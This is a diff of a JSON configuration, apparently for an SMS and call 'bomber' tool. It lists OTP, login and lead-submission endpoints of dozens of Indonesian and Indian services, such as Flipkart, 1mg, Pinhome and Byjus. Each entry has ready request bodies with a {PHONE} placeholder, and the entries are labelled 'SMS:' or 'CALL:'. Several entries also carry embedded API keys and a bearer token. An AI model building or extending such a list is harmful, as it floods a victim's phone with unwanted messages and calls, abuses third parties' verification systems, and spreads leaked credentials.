@@ -1,68 +1,321 @@
-[
-  {
-    "name": "Adiraku",
-    "url": "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
-    "method": "POST",
-    "headers": {
-      "Content-Type": "application/json; charset=utf-8"
+﻿[
+    {
+        "body_template":  "{\"mobileNumber\":\"{PHONE}\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}",
+        "method":  "POST",
+        "url":  "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
+        "name":  "Adiraku",
+        "headers":  {
+                        "Content-Type":  "application/json; charset=utf-8"
+                    }
     },
-    "body_template": "{\"mobileNumber\":\"{PHONE}\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
-  },
-  {
-    "name": "Singa",
-    "url": "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153&platform=android",
-    "method": "POST",
-    "headers": {
-      "Content-Type": "application/json; charset=utf-8",
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+    {
+        "body_template":  "{\"mobile_phone\":\"+{PHONE}\",\"type\":\"mobile\",\"is_switchable\":1}",
+        "method":  "POST",
+        "url":  "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7\u0026versionCode=153\u0026platform=android",
+        "name":  "Singa",
+        "headers":  {
+                        "User-Agent":  "Mozilla/5.0 (Linux; Android 10)",
+                        "Content-Type":  "application/json; charset=utf-8"
+                    }
     },
-    "body_template": "{\"mobile_phone\":\"+{PHONE}\",\"type\":\"mobile\",\"is_switchable\":1}"
-  },
-  {
-    "name": "Pinhome",
-    "url": "https://www.pinhome.id/api/pinaccount/request/otp",
-    "method": "POST",
-    "headers": {
-      "Host": "www.pinhome.id",
-      "Accept": "application/json",
-      "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
-      "Content-Type": "application/json",
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
-      "Origin": "https://www.pinhome.id"
+    {
+        "body_template":  "{\"accountType\":\"customers\",\"countryCode\":\"62\",\"medium\":\"whatsapp\",\"otpType\":\"register\",\"phoneNumber\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://www.pinhome.id/api/pinaccount/request/otp",
+        "name":  "Pinhome",
+        "headers":  {
+                        "User-Agent":  "Mozilla/5.0 (Linux; Android 10)",
+                        "Host":  "www.pinhome.id",
+                        "Authorization":  "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
+                        "Content-Type":  "application/json",
+                        "Accept":  "application/json",
+                        "Origin":  "https://www.pinhome.id"
+                    }
     },
-    "body_template": "{\"accountType\":\"customers\",\"countryCode\":\"62\",\"medium\":\"whatsapp\",\"otpType\":\"register\",\"phoneNumber\":\"{PHONE}\"}"
-  },
-  {
-    "name": "Maulagi",
-    "url": "https://api.maulagi.id/api/v2/auth/check",
-    "method": "POST",
-    "headers": {
-      "accept": "application/json, text/plain, */*",
-      "content-type": "application/json",
-      "origin": "https://maulagi.id",
-      "referer": "https://maulagi.id/",
-      "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
-      "x-ml-key": "E32VCHXX32"
+    {
+        "body_template":  "{\"credentials\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://api.maulagi.id/api/v2/auth/check",
+        "name":  "Maulagi",
+        "headers":  {
+                        "user-agent":  "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
+                        "content-type":  "application/json",
+                        "referer":  "https://maulagi.id/",
+                        "x-ml-key":  "E32VCHXX32",
+                        "accept":  "application/json, text/plain, */*",
+                        "origin":  "https://maulagi.id"
+                    }
     },
-    "body_template": "{\"credentials\":\"{PHONE}\"}"
-  },
-  {
-    "name": "Saturdays",
-    "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
-    "method": "POST",
-    "headers": {
-      "accept": "*/*",
-      "accept-language": "id-ID,id;q=0.9",
-      "content-type": "application/json",
-      "country-code": "ID",
-      "currency-code": "IDR",
-      "device-type": "mweb",
-      "origin": "https://saturdays.com",
-      "referer": "https://saturdays.com/",
-      "user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
-      "platform": "mweb",
-      "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
+    {
+        "body_template":  "{\"number\":\"{PHONE}\",\"country_code\":\"+62\",\"type\":\"\"}",
+        "method":  "POST",
+        "url":  "https://beta.api.saturdays.com/api/v1/user/otp/send",
+        "name":  "Saturdays",
+        "headers":  {
+                        "currency-code":  "IDR",
+                        "origin":  "https://saturdays.com",
+                        "platform":  "mweb",
+                        "x-api-key":  "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
+                        "referer":  "https://saturdays.com/",
+                        "accept":  "*/*",
+                        "content-type":  "application/json",
+                        "country-code":  "ID",
+                        "accept-language":  "id-ID,id;q=0.9",
+                        "user-agent":  "Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
+                        "device-type":  "mweb"
+                    }
     },
-    "body_template": "{\"number\":\"{PHONE}\",\"country_code\":\"+62\",\"type\":\"\"}"
-  }
+    {
+        "body_template":  "{\"name\":\"\",\"mob\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://www.justdial.com/functions/whatsappverification.php?wap=77",
+        "name":  "SMS:JustDial",
+        "headers":  {
+                        "City":  "NEWDELHI",
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"phone\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://login.housing.com/api/v2/send-otp",
+        "name":  "SMS:Housing",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"firstName\":\"xxps\",\"login\":\"wiqpdl223@wqew.com\",\"password\":\"QASpw@1s\",\"genderType\":\"Male\",\"mobileNumber\":\"{PHONE}\",\"requestType\":\"SENDOTP\"}",
+        "method":  "POST",
+        "url":  "https://login.web.ajio.com/api/auth/signupSendOTP",
+        "name":  "SMS:Ajio",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"phone\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://unacademy.com/api/v1/user/get_app_link/",
+        "name":  "SMS:Unacademy",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"contactNumber\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://pharmeasy.in/api/auth/requestOTP",
+        "name":  "SMS:pharmeasy",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile\":\"{PHONE}\",\"deviceName\":\"\",\"refCode\":\"\",\"isPlaycircle\":false}",
+        "method":  "POST",
+        "url":  "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+        "name":  "Sms:RummyCircle",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"phone\":\"{PHONE}\",\"captcha_token\":null}",
+        "method":  "POST",
+        "url":  "https://www.licious.in/api/login/signup",
+        "name":  "SMS:Licious",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"contact_number\":\"{PHONE}\",\"whatsapp\":false,\"code_len\":4}",
+        "method":  "POST",
+        "url":  "https://api.spinny.com/api/c/user/otp-request/v2/",
+        "name":  "SMS:Spinny",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"phone\":\"{PHONE}\",\"countryCallingCode\":\"+91\",\"captchaResponse\":null}",
+        "method":  "POST",
+        "url":  "https://www.cult.fit/api/auth/loginPhoneSendOtp",
+        "name":  "SMS:CultFit",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
+        "name":  "SMS:Udaan",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"number\":\"{PHONE}\",\"email\":\"\",\"is_corporate_user\":false,\"signup_source\":\"\"}",
+        "method":  "POST",
+        "url":  "https://www.1mg.com/auth_api/v6/create_token",
+        "name":  "SMS:TATA1mg",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "91-{PHONE}",
+        "method":  "POST",
+        "url":  "https://byjus.com/question-answer/api/request_otp/",
+        "name":  "SMS:Byjus",
+        "headers":  {
+                        "Content-Type":  "text/plain"
+                    }
+    },
+    {
+        "body_template":  "{\"mobileNumber\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://api.payrup.com/api/auth/otp/generate",
+        "name":  "SMS:Payrup",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile_number\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://api.shadowfax.in/delivery/otp/send/",
+        "name":  "SMS:ShadowFax",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  null,
+        "method":  "GET",
+        "url":  "https://www.healthkart.com/veronica/user/validate/1/{PHONE}/signup?plt=1\u0026st=1",
+        "name":  "SMS:HealthKart",
+        "headers":  {
+
+                    }
+    },
+    {
+        "body_template":  null,
+        "method":  "GET",
+        "url":  "https://www.netmeds.com/mst/rest/v1/id/details/{PHONE}",
+        "name":  "SMS:Netmeds",
+        "headers":  {
+
+                    }
+    },
+    {
+        "body_template":  "{\"payload\":\"{\\\"phone\\\":\\\"{PHONE}\\\",\\\"realm\\\":\\\"pa\\\"}\"}",
+        "method":  "POST",
+        "url":  "https://www.mfine.co/consult/proxy/uml/pbl/us/csuo",
+        "name":  "SMS:Mfine",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile\":\"+91{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://www.lybrate.com/w-ang/v2/p/login-signup",
+        "name":  "SMS:Lybrate",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"source\":\"medibuddyInWeb\",\"platform\":\"medibuddy\",\"phonenumber\":\"{PHONE}\",\"flow\":\"Retail-Login-Home-Flow\",\"idealLoginFlow\":false,\"advertiserId\":\"5a6a5f90-6036-L8cf-9ffd-60eacff1f24d\",\"mbUserId\":null}",
+        "method":  "POST",
+        "url":  "https://loginprod.medibuddy.in/unified-login/user/register",
+        "name":  "SMS:Medibuddy",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  null,
+        "method":  "GET",
+        "url":  "https://www.oneapollo.com/wp-json/lmsRoute/v1/user/?mobile={PHONE}",
+        "name":  "SMS:OneApollo",
+        "headers":  {
+
+                    }
+    },
+    {
+        "body_template":  "{\"mobile_no\":\"+91{PHONE}\",\"allow_whatsapp\":true,\"auto_retry\":false}",
+        "method":  "POST",
+        "url":  "https://cowin.eka.care/v2/generate_otp",
+        "name":  "SMS:EkaCare",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"loginId\":\"+91{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
+        "name":  "SMS:Flipkart",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile\":\"{PHONE}\"}",
+        "method":  "POST",
+        "url":  "https://www.gamezy.com/api/rummy-prime/download/app/sms",
+        "name":  "SMS:Gamezy",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"city\":\"Mumbai\",\"firstName\":\"Uiop Kumar\",\"mobile\":\"{PHONE}\",\"disease\":\"Hair Loss\",\"source\":\"lybrate_seo\",\"pageType\":\"Home Page\",\"additionalParams\":{\"referralUrl\":\"https://www.lybrate.com/\",\"uid\":null,\"lpt\":\"lybrate_seo\"},\"checkedSymptoms\":[]}",
+        "method":  "POST",
+        "url":  "https://www.lybrate.com/w-api/surgery/lead/submit",
+        "name":  "CALL:Lybrate",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  null,
+        "method":  "GET",
+        "url":  "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={PHONE}",
+        "name":  "CALL:MyJAR",
+        "headers":  {
+
+                    }
+    },
+    {
+        "body_template":  "{\"number\":\"{PHONE}\",\"email\":\"\",\"is_corporate_user\":false,\"otp_on_call\":true,\"signup_source\":\"\"}",
+        "method":  "POST",
+        "url":  "https://www.1mg.com/auth_api/v6/create_token",
+        "name":  "CALL:TATA1mg",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"phone\":\"{PHONE}\",\"country_code\":\"IN\",\"otp_type\":2,\"email\":\"\",\"send_otp\":true,\"is_un_teach_user\":false}",
+        "method":  "POST",
+        "url":  "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+        "name":  "CALL:Unacademy",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    },
+    {
+        "body_template":  "{\"mobile\":\"{PHONE}\",\"deviceName\":\"\",\"refCode\":\"\",\"isPlaycircle\":false}",
+        "method":  "POST",
+        "url":  "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+        "name":  "CALL:RummyCircle",
+        "headers":  {
+                        "Content-Type":  "application/json"
+                    }
+    }
 ]
